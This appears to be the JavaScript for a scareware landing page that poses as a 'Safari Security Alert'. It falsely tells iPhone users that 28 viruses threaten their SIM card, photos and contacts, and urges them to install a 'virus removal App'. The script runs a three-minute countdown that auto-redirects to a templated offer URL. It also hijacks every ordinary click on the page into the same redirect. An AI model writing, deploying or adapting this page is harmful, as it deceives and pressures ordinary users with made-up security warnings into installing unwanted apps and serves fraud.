const OFFER_URL = "{offer}";
const COUNTDOWN_SECONDS = 180;

const translations = {
  en: {
    title: "Safari Security Alert",
    brand: "Safari",
    heroDanger: "28 VIRUSES",
    heroTitle: " have been found on your iPhone, causing infection and damage.",
    heroCopy: "Your iPhone is infected with viruses that could soon damage your SIM card, data, photos, and contacts if not fixed immediately.",
    stepsTitle: "How to remove virus:",
    stepOne: "Tap the button below & go to App Store to Install the recommended virus removal App for free.",
    stepTwo: "Run the app to remove all viruses.",
    cta: "Remove Viruses Now"
  }
};

const locale = document.documentElement.lang || "en";
const dictionary = translations[locale] || translations.en;
let remainingSeconds = COUNTDOWN_SECONDS;
let redirected = false;

function setViewportHeight() {
  const viewportHeight = window.visualViewport
    ? window.visualViewport.height
    : window.innerHeight;

  document.documentElement.style.setProperty(
    "--app-viewport-height",
    `${Math.round(viewportHeight)}px`
  );
}

function fitContentToViewport() {
  const landing = document.querySelector(".landing");
  const cta = document.querySelector(".cta");
  if (!landing || !cta) return;

  const measure = () => {
    const viewportHeight = window.visualViewport
      ? window.visualViewport.height
      : window.innerHeight;
    const ctaBottom = cta.getBoundingClientRect().bottom;
    return ctaBottom > viewportHeight - 18;
  };

  landing.classList.remove("is-content-tight", "is-content-ultra-tight");

  window.requestAnimationFrame(() => {
    if (!measure()) return;

    landing.classList.add("is-content-tight");

    window.requestAnimationFrame(() => {
      landing.classList.toggle("is-content-ultra-tight", measure());
    });
  });
}

function applyTranslations() {
  document.title = dictionary.title;

  document.querySelectorAll("[data-i18n]").forEach((node) => {
    const key = node.dataset.i18n;
    node.textContent = dictionary[key] || key;
  });
}

function setCurrentDate() {
  const dateNode = document.querySelector("[data-current-date]");
  if (!dateNode) return;

  const now = new Date();
  dateNode.dateTime = now.toISOString();
  dateNode.textContent = new Intl.DateTimeFormat(locale, {
    month: "long",
    day: "numeric",
    year: "numeric"
  }).format(now);
}

function renderCountdown() {
  const timerNode = document.querySelector("[data-countdown]");
  if (!timerNode) return;

  const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
  const seconds = String(remainingSeconds % 60).padStart(2, "0");
  timerNode.textContent = `00:${minutes}:${seconds}`;
}

function goToOffer() {
  if (redirected) return;
  redirected = true;
  window.location.href = OFFER_URL;
}

function startCountdown() {
  renderCountdown();

  const intervalId = window.setInterval(() => {
    remainingSeconds -= 1;
    renderCountdown();

    if (remainingSeconds <= 0) {
      window.clearInterval(intervalId);
      goToOffer();
    }
  }, 1000);
}

function bindClicks() {
  const offerLink = document.querySelector("[data-offer-link]");
  if (offerLink) {
    offerLink.href = OFFER_URL;
    offerLink.addEventListener("click", (event) => {
      event.preventDefault();
      goToOffer();
    });
  }

  document.addEventListener("click", (event) => {
    const isModifiedClick = event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
    if (isModifiedClick) return;

    event.preventDefault();
    goToOffer();
  });
}

applyTranslations();
setViewportHeight();
setCurrentDate();
startCountdown();
bindClicks();
fitContentToViewport();

window.addEventListener("resize", () => {
  setViewportHeight();
  fitContentToViewport();
});
window.addEventListener("orientationchange", () => {
  setViewportHeight();
  fitContentToViewport();
});

if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", () => {
    setViewportHeight();
    fitContentToViewport();
  });
  window.visualViewport.addEventListener("scroll", () => {
    setViewportHeight();
    fitContentToViewport();
  });
}
